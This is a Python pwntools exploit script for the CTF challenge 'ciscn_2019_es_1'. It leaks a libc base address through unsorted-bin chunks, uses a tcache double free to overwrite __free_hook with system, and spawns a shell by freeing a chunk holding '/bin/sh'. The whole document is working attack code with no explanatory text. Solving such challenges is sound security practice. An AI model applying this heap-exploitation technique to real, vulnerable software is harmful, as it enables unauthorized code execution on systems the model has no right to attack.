from pwn import *
context.log_level = 'debug'

elf = ELF("./ciscn_2019_es_1")
p = elf.process()
libc = ELF("./libc-2.27.so")
#p = remote("")
def dbg():
	gdb.attach(p)
	p.interactive()

def add(size, name, call):
	p.sendlineafter("choice:", '1')
	p.sendlineafter("compary's name\n", str(size))
	p.sendafter("name:\n", name)
	p.sendlineafter("call:\n", call)

def show(idx):
	p.sendlineafter("choice:", '2')
	p.sendlineafter("index:\n", str(idx))

def free(idx):
	p.sendlineafter("choice:", '3')
	p.sendlineafter("index:\n", str(idx))

def exp():
	for i in range(9):	
		add(0x80, '/bin/sh', 'call')
	for i in range(8):	
		free(i)
	show(7)
	libc_base = u64(p.recvuntil("\x7f")[-6:]+'\x00\x00')-0x3ebca0
	log.success("libc_base ==> " + hex(libc_base))	
	free_hook = libc_base + libc.sym['__free_hook']
	system = libc_base + libc.sym['system']	
	add(0x20, 'a', 'a')
	free(9)
	free(9)
	add(0x20, p64(free_hook), 'a')	
	add(0x20, 'a', 'a')
	add(0x20, p64(system), 'a')
	free(8)
	p.interactive()
if __name__ == '__main__':
	exp()
